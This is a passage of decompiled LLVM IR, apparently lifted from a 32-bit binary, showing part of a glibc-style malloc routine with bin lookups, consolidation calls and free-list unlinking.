  %v1_8050281 = call i32 @__errno_location(i32 %v0_8050281)
  store i32 %v1_8050281, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050288 = inttoptr i32 %v1_8050281 to i32*
  store i32 12, i32* %v1_8050288, align 4
  br label %dec_label_pc_80509e6

dec_label_pc_8050293:                             ; preds = %entry
  %v1_8050293 = add i32 %v0_805027c, 11
  %tmp136 = icmp ult i32 %v1_8050293, 16
  br i1 %tmp136, label %dec_label_pc_80502aa, label %dec_label_pc_80502a3

dec_label_pc_80502a3:                             ; preds = %dec_label_pc_8050293
  %v1_80502a3 = and i32 %v1_8050293, -8
  br label %dec_label_pc_80502aa

dec_label_pc_80502aa:                             ; preds = %dec_label_pc_8050293, %dec_label_pc_80502a3
  %storemerge133 = phi i32 [ %v1_80502a3, %dec_label_pc_80502a3 ], [ %v1_8050293, %dec_label_pc_8050293 ]
  %v1_805064a = phi i32 [ %v1_80502a3, %dec_label_pc_80502a3 ], [ 16, %dec_label_pc_8050293 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_80502aa = load i8, i8* @global_var_80603a0.188, align 1
  %v1_80502aa = sext i8 %v0_80502aa to i32
  store i32 %v1_80502aa, i32* @ebx, align 4
  %v3_80502b0 = urem i8 %v0_80502aa, 2
  %v4_80502b0 = icmp eq i8 %v3_80502b0, 0
  %v1_80502b3 = icmp eq i1 %v4_80502b0, false
  br i1 %v1_80502b3, label %dec_label_pc_80502d2, label %dec_label_pc_80502b5

dec_label_pc_80502b5:                             ; preds = %dec_label_pc_80502aa
  %v2_80502b5 = icmp eq i8 %v0_80502aa, 0
  %v1_80502b7 = icmp eq i1 %v2_80502b5, false
  br i1 %v1_80502b7, label %dec_label_pc_80505b5, label %dec_label_pc_80502bd

dec_label_pc_80502bd:                             ; preds = %dec_label_pc_80502b5
  store i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32* %stack_var_-92, align 4
  %v2_80502c5 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80603a0.188 to i32*))
  store i32 %v2_80502c5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80505b5

dec_label_pc_80502d2:                             ; preds = %dec_label_pc_80502aa
  %v11_80502d2 = trunc i32 %v1_805064a to i8
  %v8_80502d6 = icmp ugt i8 %v11_80502d2, %v0_80502aa
  br i1 %v8_80502d6, label %dec_label_pc_80502f3, label %dec_label_pc_80502d8

dec_label_pc_80502d8:                             ; preds = %dec_label_pc_80502d2
  %v2_80502dc = udiv i32 %v1_805064a, 2
  store i32 %v2_80502dc, i32* %eax.global-to-local, align 4
  %v1_80502de = add i32 %v2_80502dc, ptrtoint (i8* @global_var_80603a0.188 to i32)
  store i32 %v1_80502de, i32* @ecx, align 4
  %v1_80502e4 = add i32 %v2_80502dc, add (i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32 -4)
  %v2_80502e4 = inttoptr i32 %v1_80502e4 to i32*
  %v3_80502e4 = load i32, i32* %v2_80502e4, align 4
  store i32 %v3_80502e4, i32* @edx, align 4
  %v1_80502e7 = icmp eq i32 %v3_80502e4, 0
  br i1 %v1_80502e7, label %dec_label_pc_80502f3, label %dec_label_pc_80502eb

dec_label_pc_80502eb:                             ; preds = %dec_label_pc_80502d8
  %v1_80502eb = add i32 %v3_80502e4, 8
  %v2_80502eb = inttoptr i32 %v1_80502eb to i32*
  %v3_80502eb = load i32, i32* %v2_80502eb, align 4
  store i32 %v3_80502eb, i32* %eax.global-to-local, align 4
  store i32 %v3_80502eb, i32* %v2_80502e4, align 4
  br label %dec_label_pc_805032c

dec_label_pc_80502f3:                             ; preds = %dec_label_pc_80502d8, %dec_label_pc_80502d2
  %v8_80502f3 = icmp ult i32 %v1_805064a, 255
  %v6_80502fb = icmp ugt i32 %v1_805064a, 255
  store i32 %v1_805064a, i32* @eax, align 4
  br i1 %v6_80502fb, label %dec_label_pc_8050334, label %dec_label_pc_80502fd

dec_label_pc_80502fd:                             ; preds = %dec_label_pc_80502f3
  %v2_8050301 = udiv i32 %v1_805064a, 8
  store i32 %v2_8050301, i32* %eax.global-to-local, align 4
  %v1_8050304 = mul nuw i32 %v2_8050301, 8
  %v2_8050304 = add i32 %v1_8050304, ptrtoint (i32* @global_var_80603cc.189 to i32)
  store i32 %v2_8050304, i32* @ecx, align 4
  %v1_805030f = add i32 %v1_8050304, add (i32 ptrtoint (i32* @global_var_80603cc.189 to i32), i32 12)
  %v2_805030f = inttoptr i32 %v1_805030f to i32*
  %v3_805030f = load i32, i32* %v2_805030f, align 4
  store i32 %v3_805030f, i32* @edx, align 4
  %v12_8050312 = icmp eq i32 %v3_805030f, %v2_8050304
  br i1 %v12_8050312, label %dec_label_pc_8050430.preheader, label %dec_label_pc_805031a

dec_label_pc_805031a:                             ; preds = %dec_label_pc_80502fd
  store i32 %v1_805064a, i32* %ebx.global-to-local, align 4
  %v1_805031e = add i32 %v3_805030f, 12
  %v2_805031e = inttoptr i32 %v1_805031e to i32*
  %v3_805031e = load i32, i32* %v2_805031e, align 4
  store i32 %v3_805031e, i32* %eax.global-to-local, align 4
  %v2_8050321 = or i32 %v1_805064a, 4
  %v3_8050321 = add i32 %v3_805030f, %v2_8050321
  %v4_8050321 = inttoptr i32 %v3_8050321 to i32*
  %v5_8050321 = load i32, i32* %v4_8050321, align 4
  %v6_8050321 = or i32 %v5_8050321, 1
  store i32 %v6_8050321, i32* %v4_8050321, align 4
  %v0_8050326 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050326 = load i32, i32* @ecx, align 4
  %v2_8050326 = add i32 %v1_8050326, 12
  %v3_8050326 = inttoptr i32 %v2_8050326 to i32*
  store i32 %v0_8050326, i32* %v3_8050326, align 4
  %v0_8050329 = load i32, i32* @ecx, align 4
  %v1_8050329 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050329 = add i32 %v1_8050329, 8
  %v3_8050329 = inttoptr i32 %v2_8050329 to i32*
  store i32 %v0_8050329, i32* %v3_8050329, align 4
  br label %dec_label_pc_805032c

dec_label_pc_805032c:                             ; preds = %dec_label_pc_80502eb, %dec_label_pc_805031a
  %v0_805032c = load i32, i32* @edx, align 4
  %v1_805032c = add i32 %v0_805032c, 8
  store i32 %v1_805032c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80509d5

dec_label_pc_8050334:                             ; preds = %dec_label_pc_80502f3
  %v0_8050338 = call i32 @__malloc_largebin_index()
  store i32 %v0_8050338, i32* %eax.global-to-local, align 4
  %v3_805033d = and i8 %v0_80502aa, 2
  %v4_805033d = icmp eq i8 %v3_805033d, 0
  br i1 %v4_805033d, label %dec_label_pc_8050430.preheader, label %dec_label_pc_805034a

dec_label_pc_805034a:                             ; preds = %dec_label_pc_8050334
  store i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32* %stack_var_-92, align 4
  %v2_8050352 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80603a0.188 to i32*))
  store i32 %v2_8050352, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050430.preheader

dec_label_pc_8050430.preheader:                   ; preds = %dec_label_pc_805034a, %dec_label_pc_80502fd, %dec_label_pc_8050334
  %stack_var_-40.0.ph = phi i32 [ %v2_8050301, %dec_label_pc_80502fd ], [ %v0_8050338, %dec_label_pc_805034a ], [ %v0_8050338, %dec_label_pc_8050334 ]
  %v1_8050386 = add i32 %v1_805064a, 16
  %v0_8050430109 = load i32, i32* @global_var_80603e0.192, align 32
  store i32 %v0_8050430109, i32* @ebp, align 4
  %v9_8050436115 = icmp eq i32 %v0_8050430109, 134611924
  %v1_805043c117 = icmp eq i1 %v9_8050436115, false
  br i1 %v1_805043c117, label %dec_label_pc_805035f, label %dec_label_pc_8050442

dec_label_pc_805035f:                             ; preds = %dec_label_pc_8050430.preheader, %bb82
  %v0_8050430118 = phi i32 [ %v0_8050430, %bb82 ], [ %v0_8050430109, %dec_label_pc_8050430.preheader ]
  %v1_805035f = add i32 %v0_8050430118, 4
  %v2_805035f = inttoptr i32 %v1_805035f to i32*
  %v3_805035f = load i32, i32* %v2_805035f, align 4
  %v1_8050362 = add i32 %v0_8050430118, 12
  %v2_8050362 = inttoptr i32 %v1_8050362 to i32*
  %v3_8050362 = load i32, i32* %v2_8050362, align 4
  store i32 %v3_8050362, i32* @edx, align 4
  %v1_8050365 = and i32 %v3_805035f, -4
  store i32 %v1_8050365, i32* @edi, align 4
  br i1 %v6_80502fb, label %dec_label_pc_8050391, label %dec_label_pc_8050372

dec_label_pc_8050372:                             ; preds = %dec_label_pc_805035f
  %v9_8050372 = icmp eq i32 %v3_8050362, 134611924
  %v1_8050378 = icmp eq i1 %v9_8050372, false
  br i1 %v1_8050378, label %dec_label_pc_8050391, label %dec_label_pc_805037a

dec_label_pc_805037a:                             ; preds = %dec_label_pc_8050372
  %v1_805037a = load i32, i32* @global_var_80603d0.190, align 16
  %v12_805037a = icmp eq i32 %v0_8050430118, %v1_805037a
  %v1_8050380 = icmp eq i1 %v12_805037a, false
  br i1 %v1_8050380, label %dec_label_pc_8050391, label %dec_label_pc_8050382

dec_label_pc_8050382:                             ; preds = %dec_label_pc_805037a
  store i32 %v1_8050386, i32* %eax.global-to-local, align 4
  %v6_805038b = icmp ugt i32 %v1_8050365, %v1_8050386
  br i1 %v6_805038b, label %dec_label_pc_8050970, label %dec_label_pc_8050391

dec_label_pc_8050391:                             ; preds = %dec_label_pc_8050382, %dec_label_pc_805037a, %dec_label_pc_8050372, %dec_label_pc_805035f
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_8050362, i32* @global_var_80603e0.192, align 4
  %v2_8050399 = add i32 %v3_8050362, 8
  %v3_8050399 = inttoptr i32 %v2_8050399 to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v3_8050399, align 4
  %v0_805039c = load i32, i32* @edi, align 4
  %v15_805039c = icmp eq i32 %v0_805039c, %v1_805064a
  br i1 %v15_805039c, label %dec_label_pc_80509b1, label %dec_label_pc_80503a6

dec_label_pc_80503a6:                             ; preds = %dec_label_pc_8050391
  %v6_80503ac = icmp ugt i32 %v0_805039c, 255
  br i1 %v6_80503ac, label %dec_label_pc_80503bf, label %dec_label_pc_80503ae

dec_label_pc_80503ae:                             ; preds = %dec_label_pc_80503a6
  %v2_80503b0 = udiv i32 %v0_805039c, 8
  store i32 %v2_80503b0, i32* %esi.global-to-local, align 4
  %v1_80503b3 = mul nuw i32 %v2_80503b0, 8
  %v2_80503b3 = add i32 %v1_80503b3, 134611916
  store i32 %v2_80503b3, i32* @ebx, align 4
  %v1_80503ba = add i32 %v1_80503b3, 134611924
  %v2_80503ba = inttoptr i32 %v1_80503ba to i32*
  %v3_80503ba = load i32, i32* %v2_80503ba, align 4
  store i32 %v3_80503ba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050408

dec_label_pc_80503bf:                             ; preds = %dec_label_pc_80503a6
  store i32 %v0_805039c, i32* @eax, align 4
  %v0_80503c1 = call i32 @__malloc_largebin_index()
  store i32 %v0_80503c1, i32* %esi.global-to-local, align 4
  %v1_80503c8 = mul i32 %v0_80503c1, 8
  %v2_80503c8 = add i32 %v1_80503c8, ptrtoint (i32* @global_var_80603cc.189 to i32)
  store i32 %v2_80503c8, i32* %eax.global-to-local, align 4
  %v1_80503cf = add i32 %v1_80503c8, add (i32 ptrtoint (i32* @global_var_80603cc.189 to i32), i32 8)
  %v2_80503cf = inttoptr i32 %v1_80503cf to i32*
  %v3_80503cf = load i32, i32* %v2_80503cf, align 4
  store i32 %v3_80503cf, i32* %edx.global-to-local, align 4
  %v12_80503d2 = icmp eq i32 %v3_80503cf, %v2_80503c8
  store i32 %v3_80503cf, i32* @ebx, align 4
  br i1 %v12_80503d2, label %dec_label_pc_8050408, label %dec_label_pc_80503dc

dec_label_pc_80503dc:                             ; preds = %dec_label_pc_80503bf
  %v1_80503dc = add i32 %v1_80503c8, add (i32 ptrtoint (i32* @global_var_80603cc.189 to i32), i32 12)
  %v2_80503dc = inttoptr i32 %v1_80503dc to i32*
  %v3_80503dc = load i32, i32* %v2_80503dc, align 4
  store i32 %v3_80503dc, i32* @ebx, align 4
  %v0_80503df = load i32, i32* @edi, align 4
  %v2_80503df = add i32 %v3_80503dc, 4
  %v3_80503df = inttoptr i32 %v2_80503df to i32*
  %v4_80503df = load i32, i32* %v3_80503df, align 4
  %v10_80503df = icmp ult i32 %v0_80503df, %v4_80503df
  %v1_80503e2 = icmp eq i1 %v10_80503df, false
  br i1 %v1_80503e2, label %dec_label_pc_80503ea, label %dec_label_pc_8050408

dec_label_pc_80503ea:                             ; preds = %dec_label_pc_80503dc
  %v1_80503ec = or i32 %v0_80503df, 1
  store i32 %v1_80503ec, i32* %eax.global-to-local, align 4
  store i32 %v3_80503cf, i32* %ebx.global-to-local, align 4
  %v2_8050400101 = add i32 %v3_80503cf, 4
  %v3_8050400102 = inttoptr i32 %v2_8050400101 to i32*
  %v4_8050400103 = load i32, i32* %v3_8050400102, align 4
  %v10_8050400105 = icmp ult i32 %v1_80503ec, %v4_8050400103
  br i1 %v10_8050400105, label %dec_label_pc_80503f1, label %dec_label_pc_8050405

dec_label_pc_80503f1:                             ; preds = %dec_label_pc_80503ea, %dec_label_pc_80503f1
  %v0_8050405106 = phi i32 [ %v3_80503f5, %dec_label_pc_80503f1 ], [ %v3_80503cf, %dec_label_pc_80503ea ]
  store i32 %v0_8050405106, i32* %ecx.global-to-local, align 4
  %v1_80503f5 = add i32 %v0_8050405106, 8
  %v2_80503f5 = inttoptr i32 %v1_80503f5 to i32*
  %v3_80503f5 = load i32, i32* %v2_80503f5, align 4
  store i32 %v3_80503f5, i32* %ecx.global-to-local, align 4
  store i32 %v3_80503f5, i32* %ebx.global-to-local, align 4
  %v2_8050400 = add i32 %v3_80503f5, 4
  %v3_8050400 = inttoptr i32 %v2_8050400 to i32*
  %v4_8050400 = load i32, i32* %v3_8050400, align 4
  %v10_8050400 = icmp ult i32 %v1_80503ec, %v4_8050400
  br i1 %v10_8050400, label %dec_label_pc_80503f1, label %dec_label_pc_8050405

dec_label_pc_8050405:                             ; preds = %dec_label_pc_80503f1, %dec_label_pc_80503ea
  %v0_8050405.lcssa = phi i32 [ %v3_80503cf, %dec_label_pc_80503ea ], [ %v3_80503f5, %dec_label_pc_80503f1 ]
  %v1_8050405 = add i32 %v0_8050405.lcssa, 12
  %v2_8050405 = inttoptr i32 %v1_8050405 to i32*
  %v3_8050405 = load i32, i32* %v2_8050405, align 4
  store i32 %v3_8050405, i32* @ebx, align 4
  br label %dec_label_pc_8050408

dec_label_pc_8050408:                             ; preds = %dec_label_pc_80503ae, %dec_label_pc_80503dc, %dec_label_pc_80503bf, %dec_label_pc_8050405
  %v0_8050408 = phi i32 [ %v0_80503c1, %dec_label_pc_80503bf ], [ %v0_80503c1, %dec_label_pc_8050405 ], [ %v0_80503c1, %dec_label_pc_80503dc ], [ %v2_80503b0, %dec_label_pc_80503ae ]
  %stack_var_-64.1 = phi i32 [ %v3_80503cf, %dec_label_pc_80503bf ], [ %v0_8050405.lcssa, %dec_label_pc_8050405 ], [ %v2_80503c8, %dec_label_pc_80503dc ], [ %v3_80503ba, %dec_label_pc_80503ae ]
  %v1_805040a = urem i32 %v0_8050408, 32
  %v2_805040a = icmp eq i32 %v1_805040a, 0
  store i32 %v1_805040a, i32* %esi.global-to-local, align 4
  store i32 %v1_805040a, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8050414 = sdiv i32 %v0_8050408, 32
  store i32 %v2_8050414, i32* %edx.global-to-local, align 4
  br i1 %v2_805040a, label %bb82, label %bb

bb:                                               ; preds = %dec_label_pc_8050408
  %v5_8050417 = shl i32 1, %v1_805040a
  store i32 %v5_8050417, i32* %eax.global-to-local, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_8050408, %bb
  %v5_8050419 = phi i32 [ 1, %dec_label_pc_8050408 ], [ %v5_8050417, %bb ]
  %v1_8050419 = mul nsw i32 %v2_8050414, 4
  %v2_8050419 = add i32 %v1_8050419, ptrtoint (i32* @global_var_80606d4.193 to i32)
  %v3_8050419 = inttoptr i32 %v2_8050419 to i32*
  %v4_8050419 = load i32, i32* %v3_8050419, align 4
  %v6_8050419 = or i32 %v4_8050419, %v5_8050419
  store i32 %v6_8050419, i32* %v3_8050419, align 4
  %v0_8050420 = load i32, i32* @ebx, align 4
  %v1_8050420 = load i32, i32* @ebp, align 4
  %v2_8050420 = add i32 %v1_8050420, 12
  %v3_8050420 = inttoptr i32 %v2_8050420 to i32*
  store i32 %v0_8050420, i32* %v3_8050420, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8050427 = load i32, i32* @ebp, align 4
  %v2_8050427 = add i32 %v1_8050427, 8
  %v3_8050427 = inttoptr i32 %v2_8050427 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8050427, align 4
  %v0_805042a = load i32, i32* @ebp, align 4
  %v1_805042a = load i32, i32* @esi, align 4
  %v2_805042a = add i32 %v1_805042a, 12
  %v3_805042a = inttoptr i32 %v2_805042a to i32*
  store i32 %v0_805042a, i32* %v3_805042a, align 4
  %v0_805042d = load i32, i32* @ebp, align 4
  %v1_805042d = load i32, i32* @ebx, align 4
  %v2_805042d = add i32 %v1_805042d, 8
  %v3_805042d = inttoptr i32 %v2_805042d to i32*
  store i32 %v0_805042d, i32* %v3_805042d, align 4
  %v0_8050430 = load i32, i32* @global_var_80603e0.192, align 32
  store i32 %v0_8050430, i32* @ebp, align 4
  %v9_8050436 = icmp eq i32 %v0_8050430, 134611924
  %v1_805043c = icmp eq i1 %v9_8050436, false
  br i1 %v1_805043c, label %dec_label_pc_805035f, label %dec_label_pc_8050442

dec_label_pc_8050442:                             ; preds = %bb82, %dec_label_pc_8050430.preheader
  br i1 %v8_80502f3, label %dec_label_pc_80504d0, label %dec_label_pc_8050450

dec_label_pc_8050450:                             ; preds = %dec_label_pc_8050442
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050454 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050454 = add i32 %v1_8050454, ptrtoint (i32* @global_var_80603cc.189 to i32)
  store i32 %v2_8050454, i32* %edx.global-to-local, align 4
  %v1_805045b = add i32 %v1_8050454, add (i32 ptrtoint (i32* @global_var_80603cc.189 to i32), i32 12)
  %v2_805045b = inttoptr i32 %v1_805045b to i32*
  %storemerge1.pre = load i32, i32* %v2_805045b, align 4
  br label %dec_label_pc_80504cc

dec_label_pc_8050460:                             ; preds = %dec_label_pc_80504cc
  %v1_8050460 = add i32 %v4_8050477, 4
  %v2_8050460 = inttoptr i32 %v1_8050460 to i32*
  %v3_8050460 = load i32, i32* %v2_8050460, align 4
  store i32 %v3_8050460, i32* %ebx.global-to-local, align 4
  %v1_8050463 = add i32 %v4_8050477, 12
  %v2_8050463 = inttoptr i32 %v1_8050463 to i32*
  %v3_8050463 = load i32, i32* %v2_8050463, align 4
  store i32 %v3_8050463, i32* @ecx, align 4
  %v1_8050466 = and i32 %v3_8050460, -4
  store i32 %v1_8050466, i32* @ebx, align 4
  %v10_8050469 = icmp ult i32 %v1_8050466, %v1_805064a
  br i1 %v10_8050469, label %dec_label_pc_80504cc, label %dec_label_pc_805046f

dec_label_pc_805046f:                             ; preds = %dec_label_pc_8050460
  %v1_805046f = add i32 %v4_8050477, 8
  %v2_805046f = inttoptr i32 %v1_805046f to i32*
  %v3_805046f = load i32, i32* %v2_805046f, align 4
  store i32 %v3_805046f, i32* @edx, align 4
  %v1_8050472 = add i32 %v3_805046f, 12
  %v2_8050472 = inttoptr i32 %v1_8050472 to i32*
  %v3_8050472 = load i32, i32* %v2_8050472, align 4
  %v15_8050472 = icmp eq i32 %v3_8050472, %v4_8050477
  %v1_8050475 = icmp eq i1 %v15_8050472, false
  br i1 %v1_8050475, label %dec_label_pc_805047c, label %dec_label_pc_8050477

dec_label_pc_8050477:                             ; preds = %dec_label_pc_805046f
  %v1_8050477 = add i32 %v3_8050463, 8
  %v2_8050477 = inttoptr i32 %v1_8050477 to i32*
  %v3_8050477 = load i32, i32* %v2_8050477, align 4
  %v15_8050477 = icmp eq i32 %v3_8050477, %v4_8050477
  br i1 %v15_8050477, label %dec_label_pc_8050481, label %dec_label_pc_805047c

dec_label_pc_805047c:                             ; preds = %dec_label_pc_8050477, %dec_label_pc_805046f
  %v0_805047c = call i32 @abort()
  store i32 %v0_805047c, i32* %eax.global-to-local, align 4
  %v0_8050481.pre = load i32, i32* @ebx, align 4
  %v0_8050487.pre = load i32, i32* @ecx, align 4
  %v1_8050487.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050481

dec_label_pc_8050481:                             ; preds = %dec_label_pc_8050477, %dec_label_pc_805047c
  %v1_8050487 = phi i32 [ %v3_805046f, %dec_label_pc_8050477 ], [ %v1_8050487.pre, %dec_label_pc_805047c ]
  %v0_8050487 = phi i32 [ %v3_8050463, %dec_label_pc_8050477 ], [ %v0_8050487.pre, %dec_label_pc_805047c ]
  %v0_8050481 = phi i32 [ %v1_8050466, %dec_label_pc_8050477 ], [ %v0_8050481.pre, %dec_label_pc_805047c ]
  %v5_8050483 = sub i32 %v0_8050481, %v1_805064a
  store i32 %v5_8050483, i32* %esi.global-to-local, align 4
  %v2_8050487 = add i32 %v1_8050487, 12
  %v3_8050487 = inttoptr i32 %v2_8050487 to i32*
  store i32 %v0_8050487, i32* %v3_8050487, align 4
  %v0_805048a = load i32, i32* @edx, align 4
  %v1_805048a = load i32, i32* @ecx, align 4
  %v2_805048a = add i32 %v1_805048a, 8
  %v3_805048a = inttoptr i32 %v2_805048a to i32*
  store i32 %v0_805048a, i32* %v3_805048a, align 4
  %v0_805048d = load i32, i32* %eax.global-to-local, align 4
  %v1_805048d = add i32 %v0_805048d, 8
  store i32 %v1_805048d, i32* @ecx, align 4
  %v0_8050490 = load i32, i32* %esi.global-to-local, align 4
  %tmp137 = icmp ult i32 %v0_8050490, 16
  br i1 %tmp137, label %dec_label_pc_80509bf, label %dec_label_pc_8050499

dec_label_pc_8050499:                             ; preds = %dec_label_pc_8050481
  %v2_805049d = add i32 %v0_805048d, %v1_805064a
  store i32 %v2_805049d, i32* @edx, align 4
  %v1_80504a0 = or i32 %v1_805064a, 1
  store i32 %v1_80504a0, i32* %ebx.global-to-local, align 4
  %v2_80504a3 = add i32 %v0_805048d, 4
  %v3_80504a3 = inttoptr i32 %v2_80504a3 to i32*
  store i32 %v1_80504a0, i32* %v3_80504a3, align 4
  %v0_80504a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80504a8 = or i32 %v0_80504a6, 1
  store i32 %v1_80504a8, i32* %eax.global-to-local, align 4
  %v0_80504ab = load i32, i32* @edx, align 4
  %v1_80504ab = load i32, i32* @ebp, align 4
  %v2_80504ab = add i32 %v1_80504ab, 8
  %v3_80504ab = inttoptr i32 %v2_80504ab to i32*
  store i32 %v0_80504ab, i32* %v3_80504ab, align 4
  %v0_80504ae = load i32, i32* @edx, align 4
  %v1_80504ae = load i32, i32* @ebp, align 4
  %v2_80504ae = add i32 %v1_80504ae, 12
  %v3_80504ae = inttoptr i32 %v2_80504ae to i32*
  store i32 %v0_80504ae, i32* %v3_80504ae, align 4
  %v0_80504b1 = load i32, i32* @edx, align 4
  %v1_80504b1 = add i32 %v0_80504b1, 8
  %v2_80504b1 = inttoptr i32 %v1_80504b1 to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_80504b1, align 4
  %v0_80504b8 = load i32, i32* @edx, align 4
  %v1_80504b8 = add i32 %v0_80504b8, 12
  %v2_80504b8 = inttoptr i32 %v1_80504b8 to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_80504b8, align 4
  %v0_80504bf = load i32, i32* %eax.global-to-local, align 4
  %v1_80504bf = load i32, i32* @edx, align 4
  %v2_80504bf = add i32 %v1_80504bf, 4
  %v3_80504bf = inttoptr i32 %v2_80504bf to i32*
  store i32 %v0_80504bf, i32* %v3_80504bf, align 4
  %v0_80504c2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80504c2 = load i32, i32* @edx, align 4
  %v3_80504c2 = add i32 %v1_80504c2, %v0_80504c2
  %v4_80504c2 = inttoptr i32 %v3_80504c2 to i32*
  store i32 %v0_80504c2, i32* %v4_80504c2, align 4
  br label %dec_label_pc_80509c4

dec_label_pc_80504cc:                             ; preds = %dec_label_pc_8050460, %dec_label_pc_8050450
  %v4_8050477 = phi i32 [ %storemerge1.pre, %dec_label_pc_8050450 ], [ %v3_8050463, %dec_label_pc_8050460 ]
  store i32 %v4_8050477, i32* %eax.global-to-local, align 4
  %v12_80504cc = icmp eq i32 %v4_8050477, %v2_8050454
  %v1_80504ce = icmp eq i1 %v12_80504cc, false
  br i1 %v1_80504ce, label %dec_label_pc_8050460, label %dec_label_pc_80504d0.loopexit

dec_label_pc_80504d0.loopexit:                    ; preds = %dec_label_pc_80504cc
  br label %dec_label_pc_80504d0

dec_label_pc_80504d0:                             ; preds = %dec_label_pc_80504d0.loopexit, %dec_label_pc_8050442
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_80504d9 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_80504d9, i32* %ecx.global-to-local, align 4
  %v2_80504dc = udiv i32 %v1_80504d9, 32
  store i32 %v2_80504dc, i32* @edi, align 4
  %v1_80504df = mul nuw nsw i32 %v2_80504dc, 4
  %v2_80504df = add i32 %v1_80504df, ptrtoint (i32* @global_var_80606d4.193 to i32)
  %v3_80504df = inttoptr i32 %v2_80504df to i32*
  %v4_80504df = load i32, i32* %v3_80504df, align 4
  store i32 %v4_80504df, i32* %edx.global-to-local, align 4
  %v1_80504e6 = mul i32 %v1_80504d9, 8
  %v2_80504e6 = add i32 %v1_80504e6, ptrtoint (i32* @global_var_80603cc.189 to i32)
  store i32 %v2_80504e6, i32* %ebx.global-to-local, align 4
  %v1_80504ed = urem i32 %v1_80504d9, 32
  %v2_80504ed = icmp eq i32 %v1_80504ed, 0
  store i32 %v1_80504ed, i32* %ecx.global-to-local, align 4
  br i1 %v2_80504ed, label %.preheader, label %bb83

bb83:                                             ; preds = %dec_label_pc_80504d0
  %v5_80504f0 = shl i32 1, %v1_80504ed
  store i32 %v5_80504f0, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_80504d0, %bb83, %dec_label_pc_8050531
  %v1_80504f2 = phi i32 [ %v1_80504f2.pre, %dec_label_pc_8050531 ], [ %v4_80504df, %bb83 ], [ %v4_80504df, %dec_label_pc_80504d0 ]
  %v0_80504f6 = phi i32 [ %v0_80504f2.pre, %dec_label_pc_8050531 ], [ %v5_80504f0, %bb83 ], [ 1, %dec_label_pc_80504d0 ]
  %tmp84 = icmp ule i32 %v0_80504f6, %v1_80504f2
  %v1_80504f6 = icmp eq i32 %v0_80504f6, 0
  %v1_80504f8 = icmp eq i1 %v1_80504f6, false
  %or.cond = and i1 %tmp84, %v1_80504f8
  br i1 %or.cond, label %dec_label_pc_80504f6.dec_label_pc_8050526.preheader_crit_edge, label %dec_label_pc_80504fa.preheader

dec_label_pc_80504f6.dec_label_pc_8050526.preheader_crit_edge: ; preds = %.preheader
  %v0_805052112.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050526.preheader

dec_label_pc_80504fa.preheader:                   ; preds = %.preheader
  %v0_80504fa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80504fa

dec_label_pc_80504fa:                             ; preds = %dec_label_pc_80504fa.preheader, %dec_label_pc_8050504
  %v0_80504fa = phi i32 [ %v0_80504fa.pre, %dec_label_pc_80504fa.preheader ], [ %v1_80504fa, %dec_label_pc_8050504 ]
  %v1_80504fa = add i32 %v0_80504fa, 1
  store i32 %v1_80504fa, i32* @edi, align 4
  %v6_80504fe = icmp ugt i32 %v1_80504fa, 2
  br i1 %v6_80504fe, label %dec_label_pc_80505b5.loopexit, label %dec_label_pc_8050504

dec_label_pc_8050504:                             ; preds = %dec_label_pc_80504fa
  %v1_8050504 = mul i32 %v1_80504fa, 4
  %v2_8050504 = add i32 %v1_8050504, ptrtoint (i32* @global_var_80606d4.193 to i32)
  %v3_8050504 = inttoptr i32 %v2_8050504 to i32*
  %v4_8050504 = load i32, i32* %v3_8050504, align 4
  store i32 %v4_8050504, i32* %edx.global-to-local, align 4
  %v1_805050b = icmp eq i32 %v4_8050504, 0
  br i1 %v1_805050b, label %dec_label_pc_80504fa, label %dec_label_pc_805050f

dec_label_pc_805050f:                             ; preds = %dec_label_pc_8050504
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8050516 = mul i32 %v1_80504fa, 256
  store i32 %v2_8050516, i32* %eax.global-to-local, align 4
  %v1_8050519 = add i32 %v2_8050516, ptrtoint (i32* @global_var_80603cc.189 to i32)
  store i32 %v1_8050519, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050526.preheader

dec_label_pc_8050526.preheader:                   ; preds = %dec_label_pc_80504f6.dec_label_pc_8050526.preheader_crit_edge, %dec_label_pc_805050f
  %v0_805052112 = phi i32 [ %v1_8050519, %dec_label_pc_805050f ], [ %v0_805052112.pre, %dec_label_pc_80504f6.dec_label_pc_8050526.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_805050f ], [ %v0_80504f6, %dec_label_pc_80504f6.dec_label_pc_8050526.preheader_crit_edge ]
